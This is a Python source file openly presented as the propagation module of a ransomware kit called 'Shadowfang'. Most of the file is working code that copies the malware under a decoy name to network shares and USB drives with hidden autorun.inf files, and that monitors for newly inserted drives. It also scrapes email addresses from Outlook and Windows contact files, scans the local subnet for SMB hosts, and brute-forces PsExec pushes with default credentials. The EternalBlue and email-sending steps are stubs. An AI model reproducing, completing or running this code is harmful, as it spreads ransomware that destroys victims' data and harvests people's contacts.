#!/usr/bin/env python3
"""
SHADOWFANG CORE - SPREAD.PY
Network propagation and lateral movement module
SMB exploitation, network share infection, USB spreading, email harvesting
"""

import os
import sys
import time
import socket
import struct
import shutil
import subprocess
import threading
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== NETWORK SHARE SPREADER ====================

class NetworkShareSpreader:
    """Spread via network shares"""
    
    def __init__(self):
        self.infected_shares = []
        self.failed_shares = []
        self.discovered_shares = []
    
    def discover_network_shares(self):
        """Discover network shares on local network"""
        try:
            # Use net view to discover shares
            result = subprocess.run(
                'net view',
                shell=True,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            output = result.stdout
            
            # Parse share names
            lines = output.split('\n')
            for line in lines:
                if '\\\\' in line:
                    share_name = line.strip()
                    if share_name.startswith('\\\\'):
                        self.discovered_shares.append(share_name)
            
            logger.info(f"Discovered {len(self.discovered_shares)} network shares")
            return self.discovered_shares
            
        except Exception as e:
            logger.error(f"Share discovery failed: {e}")
            return []
    
    def enumerate_share_contents(self, share_path):
        """Enumerate contents of network share"""
        try:
            result = subprocess.run(
                f'dir "{share_path}" /b',
                shell=True,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            files = result.stdout.split('\n')
            return [f.strip() for f in files if f.strip()]
            
        except:
            return []
    
    def copy_to_share(self, share_path, filename=None):
        """Copy ransomware to network share"""
        try:
            if not filename:
                filename = "Important_Document.exe"
            
            source_path = CoreUtils.get_executable_path()
            dest_path = os.path.join(share_path, filename)
            
            shutil.copy2(source_path, dest_path)
            
            self.infected_shares.append(share_path)
            logger.info(f"Ransomware copied to share: {share_path}")
            return True
            
        except Exception as e:
            self.failed_shares.append(share_path)
            logger.warning(f"Share copy failed: {share_path} - {e}")
            return False
    
    def create_autorun_inf(self, share_path):
        """Create autorun.inf for USB spread"""
        try:
            autorun_content = """[autorun]
open=Important_Document.exe
icon=Important_Document.exe
action=Open folder to view files
shell\open\command=Important_Document.exe
shell\open\Default=1
shell\explore\command=Important_Document.exe
"""
            
            autorun_path = os.path.join(share_path, 'autorun.inf')
            
            with open(autorun_path, 'w') as f:
                f.write(autorun_content)
            
            # Set attributes
            try:
                ctypes.windll.kernel32.SetFileAttributesW(
                    autorun_path,
                    Constants.FILE_ATTRIBUTE_HIDDEN | Constants.FILE_ATTRIBUTE_SYSTEM
                )
            except:
                pass
            
            return True
        except:
            return False
    
    def spread_to_all_shares(self):
        """Spread ransomware to all discovered shares"""
        total_infected = 0
        
        # Discover shares
        shares = self.discover_network_shares()
        
        for share in shares:
            try:
                if self.copy_to_share(share):
                    self.create_autorun_inf(share)
                    total_infected += 1
            except:
                continue
        
        logger.info(f"Spread to {total_infected} network shares")
        return total_infected

# ==================== SMB EXPLOIT SPREADER ====================

class SMBExploitSpreader:
    """Spread using SMB vulnerabilities"""
    
    def __init__(self):
        self.exploited_hosts = []
        self.vulnerable_hosts = []
    
    def scan_smb(self, target_ip, port=445):
        """Scan for SMB vulnerability"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            
            if result == 0:
                self.vulnerable_hosts.append(target_ip)
                return True
            
            return False
            
        except:
            return False
    
    def check_eternalblue(self, target_ip):
        """Check for EternalBlue vulnerability (MS17-010)"""
        try:
            # SMB packet for vulnerability check
            smb_packet = bytes([
                0x00, 0x00, 0x00, 0x54,  # NetBIOS session
                0xFF, 0x53, 0x4D, 0x42,  # SMB header
                0x72, 0x00, 0x00, 0x00,  # SMB command
                0x00, 0x18, 0x01, 0x20,  # Flags
                0x00, 0x00, 0x00, 0x00,  # Reserved
                0x00, 0x00, 0x00, 0x00,  # Reserved
                0x00, 0x00, 0x00, 0x00,  # Reserved
                0xFF, 0xFF, 0xFF, 0xFF,  # Tree ID
                0x00, 0x00, 0x00, 0x00,  # Process ID
                0x00, 0x00, 0x00, 0x00,  # User ID
                0x00, 0x00, 0x00, 0x00   # Multiplex ID
            ])
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, 445))
            sock.send(smb_packet)
            
            response = sock.recv(1024)
            sock.close()
            
            # Check for vulnerable response
            if len(response) > 0 and response[9:13] == b'\x72\x00\x00\x00':
                return True
            
            return False
            
        except:
            return False
    
    def scan_network_range(self, network_range):
        """Scan network range for vulnerable hosts"""
        try:
            # Parse network range
            base_ip = network_range.split('/')[0]
            parts = base_ip.split('.')
            network_prefix = '.'.join(parts[:3])
            
            for i in range(1, 255):
                target_ip = f"{network_prefix}.{i}"
                
                # Skip own IP
                if target_ip == self.get_local_ip():
                    continue
                
                if self.scan_smb(target_ip):
                    if self.check_eternalblue(target_ip):
                        logger.info(f"Vulnerable host found: {target_ip}")
                        self.exploited_hosts.append(target_ip)
            
            return self.exploited_hosts
            
        except Exception as e:
            logger.error(f"Network scan failed: {e}")
            return []
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(('8.8.8.8', 80))
            local_ip = sock.getsockname()[0]
            sock.close()
            return local_ip
        except:
            return None
    
    def exploit_eternalblue(self, target_ip):
        """Exploit EternalBlue vulnerability"""
        try:
            # This would contain the actual exploit code
            # For safety, just log the attempt
            logger.info(f"Exploiting EternalBlue on {target_ip}")
            
            # Placeholder for actual exploit
            # In real implementation, this would:
            # 1. Send crafted SMB packets
            # 2. Trigger buffer overflow
            # 3. Execute shellcode
            # 4. Upload and execute ransomware
            
            return False
        except:
            return False
    
    def spread_via_smb(self):
        """Spread ransomware via SMB"""
        try:
            local_ip = self.get_local_ip()
            if not local_ip:
                return 0
            
            network_range = f"{local_ip.rsplit('.', 1)[0]}.0/24"
            
            # Scan network
            vulnerable_hosts = self.scan_network_range(network_range)
            
            # Exploit each vulnerable host
            for host in vulnerable_hosts:
                self.exploit_eternalblue(host)
            
            return len(vulnerable_hosts)
            
        except:
            return 0

# ==================== USB SPREADER ====================

class USBSpreader:
    """Spread via USB drives"""
    
    def __init__(self):
        self.infected_usb = []
        self.usb_monitor_thread = None
        self.stop_monitoring = False
    
    def detect_usb_drives(self):
        """Detect connected USB drives"""
        usb_drives = []
        
        try:
            for drive_letter in range(ord('A'), ord('Z') + 1):
                drive = chr(drive_letter) + ':\\'
                
                if os.path.exists(drive):
                    drive_type = WinAPI.get_drive_type(drive)
                    
                    if drive_type == Constants.DRIVE_REMOVABLE:
                        usb_drives.append(drive)
            
            return usb_drives
            
        except:
            return []
    
    def spread_to_usb(self, usb_drive, filename=None):
        """Spread ransomware to USB drive"""
        try:
            if not filename:
                filename = "Important_Document.exe"
            
            source_path = CoreUtils.get_executable_path()
            dest_path = os.path.join(usb_drive, filename)
            
            # Copy ransomware
            shutil.copy2(source_path, dest_path)
            
            # Create autorun.inf
            autorun_content = """[autorun]
open=Important_Document.exe
icon=Important_Document.exe
action=Open folder to view files
shell\open\command=Important_Document.exe
shell\open\Default=1
"""
            
            autorun_path = os.path.join(usb_drive, 'autorun.inf')
            with open(autorun_path, 'w') as f:
                f.write(autorun_content)
            
            # Set hidden attributes
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(
                    dest_path,
                    Constants.FILE_ATTRIBUTE_HIDDEN | Constants.FILE_ATTRIBUTE_SYSTEM
                )
                ctypes.windll.kernel32.SetFileAttributesW(
                    autorun_path,
                    Constants.FILE_ATTRIBUTE_HIDDEN | Constants.FILE_ATTRIBUTE_SYSTEM
                )
            except:
                pass
            
            self.infected_usb.append(usb_drive)
            logger.info(f"USB infected: {usb_drive}")
            return True
            
        except Exception as e:
            logger.warning(f"USB infection failed: {usb_drive} - {e}")
            return False
    
    def spread_to_all_usb(self):
        """Spread to all connected USB drives"""
        usb_drives = self.detect_usb_drives()
        
        for drive in usb_drives:
            self.spread_to_usb(drive)
        
        return len(self.infected_usb)
    
    def start_usb_monitoring(self, interval=5):
        """Monitor for new USB drives"""
        if self.usb_monitor_thread and self.usb_monitor_thread.is_alive():
            return True
        
        self.stop_monitoring = False
        
        def monitor_worker():
            known_drives = set(self.detect_usb_drives())
            
            while not self.stop_monitoring:
                try:
                    current_drives = set(self.detect_usb_drives())
                    
                    # Check for new drives
                    new_drives = current_drives - known_drives
                    
                    for drive in new_drives:
                        self.spread_to_usb(drive)
                    
                    known_drives = current_drives
                    time.sleep(interval)
                    
                except:
                    time.sleep(interval)
        
        self.usb_monitor_thread = threading.Thread(target=monitor_worker)
        self.usb_monitor_thread.daemon = True
        self.usb_monitor_thread.start()
        
        logger.info("USB monitoring started")
        return True
    
    def stop_usb_monitoring(self):
        """Stop USB monitoring"""
        self.stop_monitoring = True
        if self.usb_monitor_thread:
            self.usb_monitor_thread.join(timeout=2)

# ==================== EMAIL SPREADER ====================

class EmailSpreader:
    """Spread via email"""
    
    def __init__(self):
        self.email_contacts = []
        self.sent_emails = []
    
    def harvest_email_contacts(self):
        """Harvest email contacts from system"""
        try:
            # Outlook contacts
            outlook_paths = [
                os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Outlook'),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft\\Outlook')
            ]
            
            for path in outlook_paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith('.pst') or file.endswith('.ost'):
                                # Parse PST/OST files
                                self._parse_pst_file(os.path.join(root, file))
            
            # Windows Contacts
            contacts_path = os.path.join(
                os.environ.get('USERPROFILE', ''),
                'Contacts'
            )
            
            if os.path.exists(contacts_path):
                for file in os.listdir(contacts_path):
                    if file.endswith('.contact'):
                        self._parse_contact_file(os.path.join(contacts_path, file))
            
            logger.info(f"Harvested {len(self.email_contacts)} email contacts")
            return self.email_contacts
            
        except:
            return []
    
    def _parse_pst_file(self, pst_path):
        """Parse PST file for email addresses"""
        try:
            # Simple string extraction for email addresses
            import re
            
            with open(pst_path, 'rb') as f:
                data = f.read()
            
            # Find email addresses
            email_pattern = rb'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            emails = re.findall(email_pattern, data)
            
            for email in emails:
                email_str = email.decode('utf-8', errors='ignore')
                if email_str not in self.email_contacts:
                    self.email_contacts.append(email_str)
                    
        except:
            pass
    
    def _parse_contact_file(self, contact_path):
        """Parse Windows contact file"""
        try:
            import xml.etree.ElementTree as ET
            
            tree = ET.parse(contact_path)
            root = tree.getroot()
            
            for email in root.iter('{http://schemas.microsoft.com/contact}EmailAddress'):
                if email.text and email.text not in self.email_contacts:
                    self.email_contacts.append(email.text)
                    
        except:
            pass
    
    def send_infected_email(self, to_email, subject="Important Document", body="Please review attached document"):
        """Send email with infected attachment"""
        try:
            # This would use SMTP to send emails
            # Placeholder for actual implementation
            logger.info(f"Would send infected email to: {to_email}")
            self.sent_emails.append(to_email)
            return True
        except:
            return False
    
    def spread_via_email(self):
        """Spread ransomware via email"""
        contacts = self.harvest_email_contacts()
        
        for contact in contacts[:100]:  # Limit to first 100
            self.send_infected_email(contact)
        
        return len(self.sent_emails)

# ==================== PS EXEC SPREADER ====================

class PSExecSpreader:
    """Spread using PSExec"""
    
    def __init__(self):
        self.psexec_path = None
        self.spread_hosts = []
    
    def find_psexec(self):
        """Find PSExec executable"""
        try:
            possible_paths = [
                'psexec.exe',
                'C:\\Windows\\System32\\psexec.exe',
                'C:\\Tools\\psexec.exe'
            ]
            
            for path in possible_paths:
                if os.path.exists(path):
                    self.psexec_path = path
                    return True
            
            return False
        except:
            return False
    
    def spread_to_host(self, target_ip, username=None, password=None):
        """Spread ransomware to remote host using PSExec"""
        try:
            if not self.psexec_path:
                self.find_psexec()
            
            if not self.psexec_path:
                return False
            
            ransomware_path = CoreUtils.get_executable_path()
            
            # Build PSExec command
            if username and password:
                command = f'{self.psexec_path} \\\\{target_ip} -u {username} -p {password} -c -f "{ransomware_path}"'
            else:
                command = f'{self.psexec_path} \\\\{target_ip} -c -f "{ransomware_path}"'
            
            subprocess.run(
                command,
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            self.spread_hosts.append(target_ip)
            logger.info(f"Spread to host: {target_ip}")
            return True
            
        except:
            return False
    
    def spread_with_credentials(self, network_range):
        """Spread using common credentials"""
        credentials = [
            ('admin', 'admin'),
            ('administrator', 'administrator'),
            ('admin', 'password'),
            ('admin', 'Password1'),
            ('user', 'user'),
            ('user', 'password'),
            ('test', 'test')
        ]
        
        base_ip = network_range.split('/')[0].rsplit('.', 1)[0]
        
        for i in range(1, 255):
            target_ip = f"{base_ip}.{i}"
            
            for username, password in credentials:
                if self.spread_to_host(target_ip, username, password):
                    break

# ==================== MAIN SPREAD MANAGER ====================

class SpreadManager:
    """Main propagation orchestrator"""
    
    def __init__(self):
        self.share_spreader = NetworkShareSpreader()
        self.smb_spreader = SMBExploitSpreader()
        self.usb_spreader = USBSpreader()
        self.email_spreader = EmailSpreader()
        self.psexec_spreader = PSExecSpreader()
        self.spreading_active = False
        self.spread_thread = None
    
    def start_spreading(self):
        """Start all spreading mechanisms"""
        logger.info("Starting ransomware propagation...")
        
        self.spreading_active = True
        
        def spread_worker():
            # Phase 1: Network shares
            logger.info("Phase 1: Network shares")
            self.share_spreader.spread_to_all_shares()
            
            # Phase 2: USB drives
            logger.info("Phase 2: USB drives")
            self.usb_spreader.spread_to_all_usb()
            self.usb_spreader.start_usb_monitoring()
            
            # Phase 3: Email
            logger.info("Phase 3: Email")
            self.email_spreader.spread_via_email()
            
            # Phase 4: SMB exploit
            logger.info("Phase 4: SMB exploit")
            self.smb_spreader.spread_via_smb()
            
            self.spreading_active = False
            logger.info("Propagation complete")
        
        self.spread_thread = threading.Thread(target=spread_worker)
        self.spread_thread.daemon = True
        self.spread_thread.start()
        
        return True
    
    def stop_spreading(self):
        """Stop all spreading"""
        self.spreading_active = False
        self.usb_spreader.stop_usb_monitoring()
        logger.info("Propagation stopped")
    
    def get_spread_status(self):
        """Get spreading status"""
        return {
            'active': self.spreading_active,
            'shares_infected': len(self.share_spreader.infected_shares),
            'usb_infected': len(self.usb_spreader.infected_usb),
            'hosts_exploited': len(self.smb_spreader.exploited_hosts),
            'emails_sent': len(self.email_spreader.sent_emails)
        }

# ==================== SINGLETON INSTANCE ====================

spread_manager = SpreadManager()

# ==================== EXPORT ====================

__all__ = [
    'NetworkShareSpreader',
    'SMBExploitSpreader',
    'USBSpreader',
    'EmailSpreader',
    'PSExecSpreader',
    'SpreadManager',
    'spread_manager'
]